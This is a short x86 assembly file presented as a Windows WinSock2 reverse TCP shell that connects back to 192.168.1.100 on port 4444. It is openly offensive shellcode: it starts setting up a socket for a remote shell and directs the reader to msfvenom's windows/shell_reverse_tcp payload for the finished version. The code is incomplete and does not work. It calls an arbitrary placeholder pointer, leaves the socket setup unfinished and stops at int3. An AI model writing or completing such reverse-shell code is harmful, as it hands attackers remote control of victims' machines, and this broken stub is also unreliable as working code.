; Windows x86 WinSock2 Reverse TCP Shell
; Connects to 192.168.1.100:4444

[BITS 32]
global _start

_start:
    ; WSAStartup
    sub  esp, 408h
    push esp
    push 0x101
    mov  eax, [ebp+0x68]   ; ws2_32.WSAStartup via kernel32
    call eax               ; (placeholder - real impl needs LoadLibrary chain)

    ; WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, ...)
    xor  eax, eax
    push eax
    push eax
    push eax
    push eax
    push 1      ; SOCK_STREAM
    push 2      ; AF_INET
    ; ... (full implementation requires PEB walking for WS2_32.DLL)
    nop
    ; See msfvenom -p windows/shell_reverse_tcp for complete shellcode
    int3
